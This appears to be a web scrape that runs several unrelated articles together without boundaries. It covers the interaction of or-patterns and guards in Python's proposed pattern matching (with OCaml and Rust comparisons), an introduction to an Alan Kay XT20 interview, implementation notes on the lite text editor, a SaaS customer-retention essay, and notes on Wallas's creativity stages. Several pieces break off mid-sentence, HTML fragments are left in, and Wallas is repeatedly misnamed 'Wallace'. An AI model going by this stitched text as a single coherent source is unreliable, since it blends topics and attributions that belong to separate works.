<p>In other words, pattern matching allows you to inspect a piece of data and simultaneously match its shape and bind the value of its fields to variables. In the above code, <code>Cat(age=age)</code> is a <em>pattern</em> that <em>matches</em> <code>Cat</code> values, and <em>binds</em> to the variable named <code>age</code>.</p>

<p>The proposal gives an informal description of the semantics of this construct, but the informal description doesn’t explain the interaction between two of the introduced features: or-patterns, and pattern guards. As it turns out, as currently implemented, the interaction between these features is somewhat surprising, and will probably yield at least one high-scoring Stack Overflow question if this PEP ends up being accepted.</p>

<h2 id="or-patterns">Or-patterns</h2>

<p>Here is an example of an or-pattern: <code>Cat(age=3) | Dog(name="Fido")</code>. This pattern matches either three-year-old cats or dogs named Fido. In practice:</p>

<div><div><pre><code><span># I have a three-year-old cat and a dog named Fido.
# This function returns true if the pet could be mine.
</span><span>def</span> <span>couldBeMyPet</span><span>(</span><span>pet</span><span>):</span>
  <span>match</span> <span>pet</span><span>:</span>
    <span>case</span> <span>Cat</span><span>(</span><span>age</span><span>=</span><span>3</span><span>)</span> <span>|</span> <span>Dog</span><span>(</span><span>name</span><span>=</span><span>"Fido"</span><span>):</span>
      <span>return</span> <span>True</span>
    <span>case</span> <span>_</span><span>:</span>
      <span>return</span> <span>False</span>

<span>print</span><span>(</span><span>couldBeMyPet</span><span>(</span><span>Cat</span><span>(</span><span>3</span><span>)))</span>
<span># prints True
</span>
<span>print</span><span>(</span><span>couldBeMyPet</span><span>(</span><span>Dog</span><span>(</span><span>"Rover"</span><span>)))</span>
<span># prints False
</span></code></pre></div></div>

<h2 id="pattern-guards">Pattern guards</h2>

<p>Pattern guards are boolean expressions that can be included in a <code>case</code> branch; the case branch is only taken if the pattern guard evaluates to true.</p>

<div><div><pre><code><span>def</span> <span>classify</span><span>(</span><span>pet</span><span>):</span>
  <span>match</span> <span>pet</span><span>:</span>
    <span>case</span> <span>Cat</span><span>(</span><span>age</span><span>=</span><span>age</span><span>)</span> <span>if</span> <span>age</span> <span>%</span> <span>2</span> <span>==</span> <span>0</span><span>:</span>
      <span>print</span><span>(</span><span>"This cat has an even age!"</span><span>)</span>
    <span>case</span> <span>Dog</span><span>(</span><span>name</span><span>=</span><span>name</span><span>)</span> <span>if</span> <span>sorted</span><span>(</span><span>name</span><span>)</span> <span>==</span> <span>list</span><span>(</span><span>name</span><span>):</span>
      <span>print</span><span>(</span><span>"This dog's name is in alphabetical order!"</span><span>)</span>
    <span>case</span> <span>_</span><span>:</span>
      <span>print</span><span>(</span><span>"I have nothing interesting to say about this pet."</span><span>)</span>

<span>classify</span><span>(</span><span>Cat</span><span>(</span><span>4</span><span>))</span>
<span># prints "This cat has an even age!"
</span>
<span>classify</span><span>(</span><span>Dog</span><span>(</span><span>"abe"</span><span>))</span>
<span># prints "This dog's name is in alphabetical order!"
</span>
<span>classify</span><span>(</span><span>Dog</span><span>(</span><span>"fido"</span><span>))</span>
<span># prints "I have nothing interesting to say about this pet."
</span></code></pre></div></div>

<p>In the above example, <code>if age % 2 == 0</code> and <code>if sorted(name) == list(name)</code> are pattern guards that allow that case to be taken only if that boolean expression evaluates to True.</p>

<h2 id="the-surprising-interaction">The surprising interaction</h2>

<p>What do you think this function does?</p>

<div><div><pre><code><span>def</span> <span>doesEitherCatHaveAnEvenAge</span><span>(</span><span>pet1</span><span>,</span> <span>pet2</span><span>):</span>
  <span>match</span> <span>(</span><span>pet1</span><span>,</span> <span>pet2</span><span>):</span>
    <span>case</span> <span>(</span><span>Cat</span><span>(</span><span>age</span><span>=</span><span>age</span><span>),</span> <span>_</span><span>)</span> <span>|</span> <span>(</span><span>_</span><span>,</span> <span>Cat</span><span>(</span><span>age</span><span>=</span><span>age</span><span>))</span> <span>if</span> <span>age</span> <span>%</span> <span>2</span> <span>==</span> <span>0</span><span>:</span>
      <span>return</span> <span>True</span>
    <span>case</span> <span>_</span><span>:</span>
      <span>return</span> <span>False</span>

<span>print</span><span>(</span><span>doesEitherCatHaveAnEvenAge</span><span>(</span><span>Cat</span><span>(</span><span>2</span><span>),</span> <span>Cat</span><span>(</span><span>4</span><span>)))</span>
<span># prints True
</span>
<span>print</span><span>(</span><span>doesEitherCatHaveAnEvenAge</span><span>(</span><span>Cat</span><span>(</span><span>2</span><span>),</span> <span>Cat</span><span>(</span><span>5</span><span>)))</span>
<span># prints True
</span>
<span>print</span><span>(</span><span>doesEitherCatHaveAnEvenAge</span><span>(</span><span>Cat</span><span>(</span><span>5</span><span>),</span> <span>Cat</span><span>(</span><span>4</span><span>)))</span>
<span># prints False (?????)
</span></code></pre></div></div>

<p>The last one (<code>doesEitherCatHaveAnEvenAge(Cat(5), Cat(4))</code>) may seem like it should evaluate to True. After all, the one of the patterns in the or-pattern seems like it matches the second cat, which is a cat with an even age.</p>

<p>Does <code>(Cat(5), Cat(4))</code> match against <code>(Cat(age=age), _) | (_, Cat(age=age)) if age % 2 == 0</code>? To answer this question, the semantics in your head might look something like this:</p>

<ol>
  <li>Well, <code>(Cat(5), Cat(4))</code> does match agains the first pattern of the or-pattern, <code>(Cat(age=age), _)</code>. This match binds the value 5 to the variable <code>age</code>.</li>
  <li>Now we check the guard <code>if age % 2 == 0</code>. Because <code>5 % 2 == 0</code> evaluates to False, this check fails.</li>
  <li>Go back to the or-pattern and see if there’s any other way to match it. In this case, <code>(Cat(5), Cat(4))</code> also matches the second pattern of the or-pattern, <code>(_, Cat(age=age)</code>. This binds the value 4 to the variable <code>age</code>.</li>
  <li>Now the guard <code>if age % 2 == 0</code> succeeds, because <code>4 % 2 == 0</code> evaluates to <code>True</code>.</li>
  <li>Because this case matches the value, we return True.</li>
</ol>

<p>This is perfectly sensible, but this is not what the implementation does. The implementation’s semantics are more like this:</p>

<ol>
  <li>Same as step 1 from above.</li>
  <li>Same as step 2 from above.</li>
  <li>Because the guard failed, the case isn’t taken! Instead, the next case is tried. This case (<code>case _:</code>) always succeeds, so we return False.</li>
</ol>

<p>In other words, pattern matching does’t have backtracking semantics, even if a value can match an or-pattern in multiple different ways.</p>

<p>I love pattern matching, and I’m excited to see that it might be adopted by such a popular language as Python. But this particular interaction of features might confuse novices. Let’s compare the approaches of other languages.</p>

<p>OCaml has the same semantics as Python here, but the OCaml compiler can emit a warning (because the compiler has enough type information to figure out whether the constituent patterns of an or-pattern can possibly match the same value in different ways).</p>

<div><div><pre><code><span>let</span> <span>()</span> <span>=</span>
  <span>match</span> <span>(</span><span>1</span><span>,</span> <span>2</span><span>)</span> <span>with</span>
  <span>|</span> <span>(</span><span>x</span><span>,</span> <span>_</span><span>)</span> <span>|</span> <span>(</span><span>_</span><span>,</span> <span>x</span><span>)</span> <span>when</span> <span>x</span> <span>=</span> <span>2</span> <span>-&gt;</span> <span>print_endline</span> <span>":)"</span>
  <span>|</span> <span>_</span> <span>-&gt;</span> <span>print_endline</span> <span>":("</span>
<span>;;</span>
</code></pre></div></div>

<p>This prints <code>:(</code>, but also emits the warning:</p>

<div><div><pre><code>Warning 57: Ambiguous or-pattern variables under guard;
variable x may match different arguments. (See manual section 9.5)
</code></pre></div></div>

<p>Rust has pattern matching and guards, and has an experimental <code>or_patterns</code> feature. It implements backtracking semantics, unlike Python. This is weird in its own right, especially in the presence of side effects. Take a look at this program:</p>

<div><div><pre><code><span>#![feature(or_patterns)]</span>

<span>// Prompt the user whether they want to accept the match</span>
<span>pub</span> <span>fn</span> <span>check</span><span>(</span><span>x</span><span>:</span> <span>i32</span><span>)</span> <span>-&gt;</span> <span>bool</span> <span>{</span>
    <span>use</span> <span>std</span><span>::</span><span>io</span><span>::{</span><span>stdin</span><span>};</span>
    <span>println!</span><span>(</span><span>"Checking this match: {}. Should we accept it? y/n"</span><span>,</span> <span>x</span><span>);</span>
    <span>let</span> <span>mut</span> <span>s</span> <span>=</span> <span>String</span><span>::</span><span>new</span><span>();</span>
    <span>stdin</span><span>()</span><span>.read_line</span><span>(</span><span>&amp;</span><span>mut</span> <span>s</span><span>)</span><span>.expect</span><span>(</span><span>"Did not enter a correct string"</span><span>);</span>
    <span>return</span> <span>s</span><span>.trim</span><span>()</span> <span>==</span> <span>"y"</span>
<span>}</span>

<span>pub</span> <span>fn</span> <span>main</span><span>()</span> <span>{</span>
    <span>match</span> <span>(</span><span>1</span><span>,</span> <span>2</span><span>)</span> <span>{</span>
        <span>(</span><span>x</span><span>,</span> <span>_</span><span>)</span> <span>|</span> <span>(</span><span>_</span><span>,</span> <span>x</span><span>)</span> <span>if</span> <span>check</span><span>(</span><span>x</span><span>)</span> <span>=&gt;</span> <span>{</span>
            <span>println!</span><span>(</span><span>":)"</span><span>)</span>
        <span>}</span>
        <span>_</span> <span>=&gt;</span> <span>{</span>
            <span>println!</span><span>(</span><span>":("</span><span>)</span>
        <span>}</span>
    <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>In particular, the guard can now run multiple times:</p>

<div><div><pre><code>$ cargo +nightly run
Checking this match: 1. Should we accept it? y/n
n
Checking this match: 2. Should we accept it? y/n
y
:)
</code></pre></div></div>

<p>I’m not sure what the right decision is for Python. Or-patterns and guards may just not compose well.</p>

<p>This summer we were due to hold our XT20 conference, which was going to focus on
how we could bring some of the approaches of the past to tackle the challenges
of the present and the future. Unfortunately, one of these future challenges
arrived, and we had to make the difficult decision to cancel the event.</p>
<p>Alan Kay was one of the leading researchers at the legendary labs of ARPA and
Xerox PARC in the 1960s and 1970s. We wanted to understand from Alan how Xerox
PARC came to be, and how could possibly reproduce what happened there, to make
similar leaps for our industry in the future.</p>
<p>When we held our XT16 conference, we made short videos with all of our speakers
to introduce their talks, and we wanted to continue this tradition with XT20. So
prior to the cancellation, we recorded a short piece with Alan to introduce the
content of his talk.</p>
<p>Alan stresses that we’re only just at the start of our industry and
that we’ve a long way to go. As he puts it, many of great ideas from
the 1960s and 1970s are still landing, before we consider the new
ground-breaking ideas that are yet to be found. To find those ideas,
we need to seek out the brightest among us, and then we have to figure
out how to fund and manage them properly.</p>

<blockquote>
<p>I got asked to give a talk at XT20 because I was one of the researchers and a
leader of a research group in the ARPA and Xerox combined research community in
the sixties and the seventies that invented many of the technologies that are in
use today including the ones that we’re using right now, these include: Personal
Computing; The Graphic User Interface; Ethernet; The Internet; Laser Printing;
Client/Server computing, and a host of other ones.</p>
<p>And so this was not just a series of inventions but was actually the creation of
several really large industries that have, according to the Wall St. Journal,
have returned about 45 trillion (US dollars) to the world, and the four largest
capital net-worth companies in America all used, are based on, these
technologies, so besides being good ideas, besides being something that can
boost human intellect and can deal with much more complicated situations, it
also has been a tremendous commercial success far beyond normal R&amp;D efforts.</p>
<p>One point of interest, I think, to people is that despite this, <strong>no country or
company or Univerisity is willing to fund such an effort!</strong>. The key is: can you
get the right people, and can you set up something that allows the researchers
and the right researchers to do the kind of stuff that normally was only done
when countries felt that they were in the middle of a war.</p>
<p>That’s the second point, there have been many such efforts, successful efforts,
such as ARPA and Xerox PARC in the past, especially in the US, and the Cold War,
and then back in WWII, and the particular way of going about it actually traces
back to the combined joint work of the UK and the US in developing Radar for
WWII. There’s a direct link in the methodologies used back then, and to an
extent in projects that are not so directly involved such as Bletchley Park (in
the UK) and Los Alamos and the Atomic Bomb effort (in the US).</p>
<p>So I think what will be of interest to the people who go to this conference will
likely be the idea first that it really can be done, and <em>has</em> been done (more
than once).</p>
<p>Most normal regular people are quite against taking what seems to be a huge risk
but in fact, the pay-off from these risks, which is actually only been a few
hundred million (GB) pounds or so, has been in the trillions!</p>
<p>So if you count up all the zeros the return on investment is not 15% but more like 20,000%,
so it actually would make good business sense for people to take these kinds of
risks, but that isn’t the way business people think. And so this is, I think, a
really interesting area to explore and that’s what I will at least open the
door to in my talk.</p>

<p>2020.06.04</p>
<p>updated: 2020.06.06</p>



<p>
  This write-up outlines some of the implementation details of the
  <a href="http://github.com/rxi/lite">lite</a> text editor. At the time of writing
  this lite is version <a href="https://github.com/rxi/lite/releases/tag/v1.06">1.06</a>.
</p>


<p>
  Lite is written mainly in Lua (5.2) with the lowest level parts written in C.
  It is written with the intent of being lightweight, easy on the eyes,
  responsive and trivial to modify and extend. To achieve this the core
  implementation aims to be <em>as simple as possible</em>: complexity is only
  brought in when it's proven the simplest method isn't practical.
</p>



<p>
  The core of lite implements documents, syntax highlighting, a
  cooperative-threading system, basic logging and the general ui layout system.
  Overall the core is in charge of handling user input, running per-frame tasks,
  and rendering the resultant frame early enough to meet the frames-per-second
  specified in <code>config.fps</code>.
</p>



<p>
  Lite implements a cooperative-threading system where by background tasks —
  such as full-document syntax highlighting and updating the internal list of
  project files — can be performed incrementally. Cooperative threads in lite are
  implemented using lua's coroutines and are referred internally as simply
  <code>threads</code>.
</p>
<p>
  A thread can be started by using the <code>core.add_thread()</code> function, this
  function takes a function, and an optional object which is used as a weak
  reference to that thread, eg. if a doc is passed as the weak reference, when
  that doc is garbage collected the coinciding thread will also cease to exist.
</p>
<p>
  As threads in lite are cooperative they're expected to regularly call
  <code>couroutine.yield()</code>. Typically this yielding is done every <code>n</code>
  lines for line-based tasks (eg. full-project search, syntax highlighting).
  When a thread yields the core will continue to render the frame, or — if there is
  still enough time left in the current frame — pass control to another thread.
  Threads can also pass a numerical argument to <code>coroutine.yield()</code> to wait
  for the number of seconds specified:
</p>
<pre>core.add_thread(function()
  -- print "hello world" every 10 seconds
  while true do
    print("hello world")
    coroutine.yield(10)
  end
end
</pre>
<p>
  Practical usage examples of lite's threading can be seen in the core's project
  file scanning (<code>data/core/init.lua</code>) and the incremental syntax highlighting
  (<code>data/core/doc/highlighter.lua</code>).
</p>


<p>
  All loaded text files in lite are stored in <code>Docs</code>. A doc keeps a table
  of a text file's lines (<code>Doc.lines</code>), undo and redo
  state, the current syntax (<code>Doc.syntax</code>), syntax highlighting state
  (<code>Doc.highlighter</code>) and caret/selection state. Docs are opened using the
  <code>core.open_doc()</code> function; if the function is called and a doc of that
  filename is already open then the existing doc is returned such that
  more-than-one doc representing the same file should never be present.
</p>
<p>
  Lite stores all the open docs in the <code>core.docs</code> table; each frame lite
  checks the number of views referencing each doc and releases those with zero
  references — this is an instance of lite favoring polling over callbacks or
  event listeners. This approach is done throughout lite; in avoiding event
  listeners we also avoid having to manage unregistering event handlers or worry
  about having those which are never unregistered through error. This leads to
  much simpler, less error-prone code.
</p>

<p>
  Lite implements a simple syntax highlighter based around lua patterns, this is
  split up into 3 parts:
</p>
<ul>
  <li><code>core.syntax</code>: stores language syntax specifications</li>
  <li><code>core.tokenizer</code>: converts text into table of tokens using a given syntax</li>
  <li><code>core.doc.highlighter</code>: stores token state for lines of a doc and handles
         full-document incremental highlighting</li>
</ul>
<p>
  A language syntax is stored as a table of lua patterns mapped to to their
  resultant token type (<code>.patterns</code>) and a table of symbols mapped to their
  token type (<code>.symbols</code>). Patterns in the pattern table can also be a
  range of the following format:
</p>
<pre>{ range_start_pattern, range_end_pattern [, escape_character] }
</pre>
<p>
  Ranges can be used for matching strings:
</p>
<pre>{ '"', '"', '\\' }
</pre>
<p>
  An example of syntax specifications can be seen in any of the
  <code>data/plugins/language_*.lua</code> files.
</p>
<p>
  The highlighter persists range state between lines by storing the pattern
  table index of the current range. As the highlighter works in increments of
  lines, ranges are useful for multi-line comments or strings which a single
  pattern would fail on.
</p>
<p>
  When the <code>tokenizer.tokenize()</code> function is called it iterates the syntax's
  pattern table from top to bottom, such that patterns higher up in the table
  take precedence. When it matches a pattern it pushes the token to the
  resultant table, if the token's content matches any of the keys in the
  <code>.symbols</code> table that value is used instead of the matched token value;
  this acts both as a more convenient way of specifying keywords as well as an
  optimization as the tokenizer can attempt matching fewer patterns, even if
  there are many keywords specified. The function returns a <code>state</code> integer
  which is used to indicate which pattern range it is currently inside if it is
  inside any.
</p>
<p>
  <code>core.doc.highlighter</code> is in charge of providing tokenized lines when
  displaying a document; each doc stores a <code>Highlighter</code> object. The
  highlighter assures highlighting information for any line that is requested
  is <em>always</em> available, even if the full-document incremental highlighter
  has not yet reached that line.
</p>
<p>
  When a request is made to the highlighter for a specific line the highlighter
  first checks its cache for the line; if it does not have the line cached —
  or, if the line's text has changed since its cached version — it immediately
  tokenizes the line, continuing from the tokenizer state left from the
  previous line. The highlighter's <code>max_wanted_line</code> field is set to
  that line's value if it's greater than the existing <code>max_wanted_line</code>.
</p>
<p>
  A doc's highlighter creates a thread when it's created which it uses to do
  full-document highlighting starting from its <code>first_invalid_line</code> up
  until the <code>max_wanted_line</code>. When a change occurs in a document the
  <code>first_invalid_line</code> is set to the first line of the change if it's
  greater than the current <code>first_invalid_line</code>.
</p>
<p>
  This implementation results in the following characteristics:
</p>
<ul>
  <li>Displayed lines are always syntax highlighted with, at the very
         least, highlighting which is valid to the current screen's content</li>
  <li>Displayed lines are <em>eventually</em> highlighted with
         full-document aware highlighting</li>
  <li>The highlighting is performed per-line, and so — with the exception
         of extremely long lines — can be done incrementally without a
         negative effect on responsiveness</li>
  <li>Highlighting is only performed up until the point in the document it
         is required, for example, up until the last visible line</li>
</ul>



<p>
  Each part of lite's UI is implemented as a <code>View</code>, that is, a document is
  shown in the UI as a <code>DocView</code>, the status bar at the bottom the
  <code>StatusView</code> etc. Each view exists within the <code>RootView</code>
  (<code>core.root_view</code>) which is in charge of calling the <code>:update()</code> and
  <code>:draw()</code> functions of each view, managing the layout of the
  views, and routing user input to relevant views.
</p>
<p>
  The rootview is implemented as a binary tree of <code>Nodes</code>. Each node is one
  of the following types:
</p>
<ul>
  <li><code>hsplit</code>: Contains two children side-by-side and a divider between them</li>
  <li><code>vsplit</code>: Contains two children one-above-the-other and a divider between them</li>
  <li><code>leaf</code>: Contains one or more views, and, if there is more than one
        view, a tab at the top for each view.</li>
</ul>
<p>
  Each frame the rootview calculates its layout based on the divider position of
  each split and sets the <code>.size</code> field of each node and view accordingly.
</p>
<p>
  The rootview also has a concept of <em>locked nodes</em>; the size of a locked
  node is not determined by the divider position but instead is set from the
  view's <code>.size</code> field. Locked nodes cannot be resized by the user as
  normal nodes would be, they cannot be closed and cannot open additional views.
  The locked-node feature is used for, amongst other things, the status bar at the
  bottom of the screen which we typically want to be always present and
  immutable.
</p>
<p>
  lite takes the approach of effectively redrawing <em>everything</em> whenever
  it needs to redraw <em>anything</em>, this lends itself to simplified UI code.
  There are no event listeners or callbacks to manage. If something changes the
  state of the UI (eg. the caret is moved), the <code>core.redraw</code> boolean is set
  to <code>true</code> to signify that something has changed and the UI is redrawn on
  that frame. For further simplicity any user input events will also set
  <code>core.redraw</code>, such that there's a guarantee any change which resulted from
  user input will result in the screen contents being updated.
</p>
<p>
  Although the idea of redrawing everything each time may appear wasteful, lite
  employs a technique where by only regions of the screen which have changed
  between frames are actually redrawn — these regions can be displayed by calling
  <code>renderer.show_debug(true)</code>. This technique is implemented on the C level
  of the code and is invisible to the lua portion which acts as if it's doing
  a full redraw each time.
</p>
<p>
  An overview of how this is achieved is detailed in the
  <a href="https://rxi.github.io/cached_software_rendering.html">Cached Software Rendering</a> write-up.
</p>



<p>
  Lite's plugin system is based around lua's module system; each plugin is
  simply a lua module (that is, a single <code>.lua</code> file, or, a directory
  containing a <code>init.lua</code> file). All modules in the <code>data/plugins</code>
  directory are automatically loaded when lite starts — this is done after
  initializing the core and before loading the user and project modules. Thus to
  install a plugin you simply place the file in the plugins directory; to
  uninstall a plugin you delete the file.
</p>
<p>
  A specific order of which plugins are loaded is not guaranteed by lite but,
  as plugins are just regular lua modules, a plugin can simply call <code>require</code>
  on another plugin if it needs to assure that …</p></div>

<p>When it comes to customer relationships, momentum is on your side: it is much easier to retain a customer than it is to find a new one. Once the initial inertia is surpassed, the effort that needs to be put into keeping a customer is significantly lower than acquiring and onboarding another customer. And a churned customer is a double loss: not only do you have to find a new customer to replace them. To grow, you will need to find two new customers. That’s why customer retention is of utmost importance to grow a business reliably.</p>



<p>This focus on retaining a customer at all costs is somewhat new. Before the subscription economy, a repeat customer was a nice-to-have, but most of the time, the relationship with the customer was over after the first transaction. Processes were optimized to get the customer through the order process and stop them from abandoning their cart. But once they ordered, it was over.</p>



<p>The membership economy is very different. Customer retention is more important than getting new customers, as churn is the silent killer. Retention can be measured in renewal or cancellation rates, and keeping it as close to 100% as possible will decide if your business is sustainable or not.</p>



<p>Luckily, there are several proven strategies to increase retention, and they all center around your relationship with your customers.</p>



<p><strong>Value Nurturing</strong></p>



<p>Value nurturing strategies increase the customer’s perceived value of your product, making the cancellation feel like a more significant loss. Showing your customers how much they benefit from your product will make them stick around longer.</p>



<p>Your goal is to over and over again confirm your customers’ belief that choosing your service was a smart choice. Not only does it have to feel right, but it should also clearly be a good economic decision, both on their first day and right now.</p>



<p>In an ideal world, customers would continuously notice what a fantastic product you provide them with. They would flood your customer service channels with thank you messages, and they would write long blog posts about how everyone should be a customer of your business, forever. Sadly, life gets in the way, and other things are much more important to your customers.</p>



<p>That’s why it’s up to you to show them what they get. Show them their progress, how much they have improved ever since they used your service. Show them how well they do compared to other users, how much impact your service has in their lives. In short: make the value they receive visible to them inside your product and in your communication.</p>



<p>It’s not only limited to this, though. The goal is to retain a customer, and showing them what they get is just one way of keeping them around. You want your product to be something they depend on. When times are tough, you want your service to be the last one to be canceled. This is best accomplished by creating voluntary dependency: offer something that your customers want to depend on. Provide so much value compared to the alternatives that they willingly take the risks inherent in every choice of using an external product.</p>



<p>A word about value: we are not just talking about your revenue here. For your customers to stick around, your business needs to provide them with benefits and advantages every single time they use it. Your customer lifetime value is inextricably linked to the perceived value of your customers.&nbsp;</p>



<p>Here’s the trick to customer success: increasing their revenue will increase yours. Make them successful, help them grow the lifetime value of their customers, and their LTV will expand as well.</p>



<p><strong>Expectation Management</strong></p>



<p>Managing expectations is a significant factor too. Being able to occasionally over-deliver will delight your customers as it is an unexpected bonus. I’m not saying you should consistently undersell your product. But surprising a customer with something good they didn’t expect is a rare occurrence in the business world. Those who succeed at that will be remembered.</p>



<p>Customers will tell a few people about a positive experience, but they will tell a few dozen about a negative one. Keeping customers above the baseline will reduce the chance of them ranting to their peers, who may often be potential customers.</p>



<p>Every impression counts. At any touchpoint, you can synchronize expectations. Find out what your customers are concerned with and adjust your priorities when expectations change. From your customer’s perspective, it’s a magical thing to see a feature suggestion become an actual feature.&nbsp;</p>



<p>The level of trust in the brand and the decisions you make are incredibly important for renewal. By aligning what your customers expect you to do with your actions, trust grows, and value generation will happen along with the expectations of your customers.</p>



<p>Those expectations change over time. In the beginning, customers often have to find their footing, and they expect ease of use and being able to integrate your product into their workflow. After a few years, focus shifts to perceived value, as your service has become a regular part of your customers’ work routine. Unless they’re really needed, customers will ask less and less for new features, and they will shift their focus onto existing parts of your offer and how the current set of features can be improved even more.</p>



<p>Throughout a customer’s lifetime, get a feel for the acceptance of and desire for self-service in your customer base. In the beginning, you can respond to every support query yourself. When you scale, more of your support will shift towards more asynchronous and self-help solutions. It’s important to take your customers with you on that journey. The early adopter that you talked to every few days through your real-time chat will have to understand that your attention is more divided. Their expectations will need to change with your structural changes.</p>



<p><strong>Find the At-Risk-of-Leaving Customers</strong></p>



<p>In the best case, a customer stays with you for many years. They love your product, their very wishes come true every time, and they become catalysts for your marketing.&nbsp;</p>



<p>This is, of course, utopian. Every single customer of yours has different problems and hardships, and what works for one may not work for the other. Inevitably, at some point, a few customers will think about canceling. If you want your retention to remain high, there are two things you can do:</p>



<p><strong>Convince them to stay before leaving.</strong>&nbsp;The hard part is to figure out who is about to leave. You can track people clicking the button that starts the cancellation process and trigger a customer service conversation. Tag this customer as someone who should receive a follow-up email asking what you can do for them. You can track other things than clear cancellation intent: do they stop using the product for a long time? Stay clear of acting too quickly, as this is often a result of vacation, maternal leave, or just other priorities. But it is worth measuring so that you have an indicator you can use to inform your communication strategy.</p>



<p><strong>Convince them to come back after they leave.</strong>&nbsp;This is your last chance to retain them as a customer. After someone cancels, give them a grace period of a few days or hours, but re-engage them. Depending on how shameless you want to be, ask them to return with a free month, or even extend them the offer of a lifetime discount for returning on a paid subscription. As long as it fits into your economic calculations, keeping a customer is worth more than losing them, even with reduced revenue.</p>



<p>There is a difference in what makes customers leave, and it is connected to how long they have been with you. Early customers are more likely to quit because of lower switching costs and less dependency on your service within their established workflows. They’re more jittery, so expect their cohorts to cancel more. Long-term customers quit for different reasons: either their perceived value decreases or the problem-solution-fit of your service is misaligned. Take your customer size and age into account when you craft your messaging for each cohort, and find something that works for each of them.</p>



<p><strong>Actionable Retention</strong></p>



<p>Here are a few things we did at FeedbackPanda to keep customer retention as high as possible.</p>



<p>Staying in touch with your customers will keep them engaged. Offer a weekly newsletter to expose them to things that happened in their industry will do two things: first, it will associate your business with a trusted source of information, and it will also show that you know what you’re talking about. Building trust and reputation goes a long way toward retaining a customer.</p>



<p>Tighten and focus your onboarding. A customer who “gets it” quickly after signing up will stay with you longer and think of your business as a dependable service. If you can reduce the number of steps until your prospective customer reaches the “a-ha” effect, go for it. There is nothing better than a customer telling their peers that your service is “a no-brainer.”&nbsp;</p>



<p>Do things that don’t scale. Send a postcard. Delight your customers with surprises on their birthdays. Send them a gift after they’ve been with you for a year. Host a meetup in the city where most of them live. Surprise them in ways that other businesses can’t — and wouldn’t. Not only will this make those customers stick around, but word will travel, and you will benefit from your customers sharing their delight and surprise with each other. When we had our first one hundred customers, we sent out postcards to all of them. A lot of customers shared photos of receiving those postcards in the mail, and consequently, a lot of prospects signed up for our service.</p>



<p>Ask your customers for testimonials. Use them on your marketing site, in app-stores, or any other platform where they can share it with their peers. This gives you reputation and your customer a feeling of being appreciated; after all, they …</p></div></div>

      </h3>

<p>Preparation focuses on learning and understanding to gather information and define the problem and its requirements.</p>

<p>Here are some key points from Wallace about this stage:</p>
<ul>
  <li>The problem should “be investigated in all directions.”</li>
  <li>The process should be a <em>“hard, conscious, systematic, and fruitless analysis of the problem”</em>.</li>
  <li>Acquire as many facts as possible and try to memorize them so that later you will be able to form associations quickly. 
&amp; A possible way of handing this preparation is to follow up on multiple propositions.</li>
</ul>

<p>A great quote from Wallas regarding this stage is:</p>

<blockquote>
  <p>Our mind is not likely to give us a clear answer to any particular problem unless we set it a clear question, and we are more likely to notice the significance of any new piece of evidence or new association of ideas if we have formed a definite conception of a case to be proved or disproved</p>
</blockquote>

<p>Some great additions from Arendse thesis regarding the implementation of Wallace model, especially when working with groups are:</p>
<ul>
  <li>Shared space for participants to put and access information</li>
  <li>Defining and clarifying group objectives</li>
  <li>Allowing a mix of public and non-public areas for participants to work.</li>
</ul>

          Incubation <a href="#incubation">#</a>
        
        
      </h3>

<p>Incubation is where the participant will not focus on the problem, but do any other non-demanding tasks (like sleeping, walking, listening to music, etc.). In contrast, the subconscious will focus on solutions.</p>

<p>Critical points from Wallace about this:</p>
<ul>
  <li>This stage should include a large amount of mental relaxation.</li>
  <li>The mental relaxation should include a certain amount of physical exercise (<em>“walking in the woods”</em>, <em>“a stroll over hill and dale”</em>)</li>
  <li>Should be aware that sometimes substituting mental relaxation or physical exercise with reading books could negatively affect the creative process. Some other times reading books - especially literature - could help.</li>
</ul>

<p>Key points from Arendse:</p>
<ul>
  <li>Do something different by switching to various tasks or unwinding.</li>
  <li>Depending on their profile, some people might work individually and others in groups.</li>
  <li>Perceptual indicators help this process: people should remain in the space where there is around the information about the subject.</li>
</ul>

          Illumination <a href="#illumination">#</a>
        
        
      </h3>

<p>Illumination is when the participant will become aware of one or many solutions to the problem. Wallace calls Intimation the moment that precedes and accompanies the flash of Illumination.</p>

<p>When talking about Intimation, one of the best descriptions was written by McMurry in the book <em>“How to Study”</em>:</p>

<blockquote>
  <p>“Many of the best thoughts, probably most of them, do not come, like a flash, fully into being but find their beginnings in dim feelings, faint intuitions that need to be encouraged and coaxed before they can be surely felt and defined.”</p>
</blockquote>

<p>Key points from Wallace:</p>
<ul>
  <li>Try to take precautions so that you will not be interrupted when the train of associations starts.</li>
  <li>Do not try to conclude and putting it into works too early in your train of associations.</li>
  <li>Sometimes you can start the Illumination by rereading some work that you did in the preparation phase.</li>
</ul>

<p>Wallace quotes here Henry Hazlitt who wrote in a book named <em>“Thinking as a science”</em> this beautiful passage:</p>
<blockquote>
  <p>“Thoughts of certain kinds are so elusive that to attempt to articulate them is to scare them away, as a fish is scared by the slightest ripple. When these thoughts are in embryo, even the infinitesimal attention required for talking cannot be spared.”</p>
</blockquote>

          Verification <a href="#verification">#</a>
        
        
      </h3>

<p>Verification (or Elaboration and Evaluation) is when the participant will evaluate if the solution is viable and satisfy the problem’s requirements. 
Wallace says that verification is not too different that Preparation and defined Verification as a process where <em>“the validity of the idea was tested, and the idea itself was reduced to exact form”</em>.</p>

      </h3>

<p>I find this book inspirational and very forward-thinking, taking into consideration that Wallace wrote it in 1926.</p>

<p>Among some interesting ideas, I take from Art of Though it that the creative process has an important component that lives into the subconscious and cannot be easily controlled. Still, some things might help the mind to come to an Illumination.</p>

<p>Here is what he says about how we arrive at a new idea:</p>
<blockquote>
  <p>Both the successful trains of association, which might have led to the ‘flash’ of success, and the final and successful train are normally either unconscious or take place (with ‘risings’ and ‘fallings’ of consciousness as success seems to approach or retire), in that periphery or ‘fringe’ of consciousness which surrounds our ‘focal’ consciousness as the sun’s ‘corona’ surrounds the disk of full luminosity.</p>
</blockquote>

<p>Another essential idea is that that a mental activity once carried on will also leave our organism more prone to repeat that activity in the future.</p>
    
      <h3 id="habits-or-actions-to-stimulate-mental-processes">
        
        
          Habits or actions to stimulate mental processes <a href="#habits-or-actions-to-stimulate-mental-processes">#</a>
        
        
      </h3>

<p>Wallace also proposes some actions to stimulate going into mental activity:</p>

<ol>
  <li>
<em>“Associative thought to a time-stimulus”</em> - if you do a mental activity every day at the same hour after a while, you will be able to go directly to focus (you will be warmed up to do the action that you wanted)</li>
  <li>
<em>“Habit of responding to a particularly sensory stimulus”</em> - it might be that some environment (the place you are, what it is in the room, etc.) are better at stimulating a type of mental activity</li>
  <li>
